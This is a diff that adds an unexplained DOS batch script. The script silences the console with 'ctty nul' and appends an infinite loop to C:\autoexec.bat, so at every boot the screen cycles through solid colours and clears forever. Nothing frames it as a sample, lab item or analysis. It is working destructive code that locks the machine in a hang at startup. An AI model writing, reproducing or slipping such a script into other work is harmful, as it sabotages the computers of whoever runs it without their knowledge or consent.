@@ -1,0 +1,21 @@
+@ctty nul
+set Ae=C:\autoexec.bat
+echo goto a >>%Ae%
+echo :a >>%Ae%
+echo @prompt $e[0;30;40m >>%Ae%
+echo cls >>%Ae%
+echo @prompt $e[0;31;41m >>%Ae%
+echo cls >>%Ae%
+echo @prompt $e[0;32;42m >>%Ae%
+echo cls >>%Ae%
+echo @prompt $e[0;33;43m >>%Ae%
+echo cls >>%Ae%
+echo @prompt $e[0;34;44m >>%Ae%
+echo cls >>%Ae%
+echo @prompt $e[0;35;45m >>%Ae%
+echo cls >>%Ae%
+echo @prompt $e[0;36;46m >>%Ae%
+echo cls >>%Ae%
+echo @prompt $e[0;37;47m >>%Ae%
+echo cls >>%Ae%
+echo goto a >>%Ae%
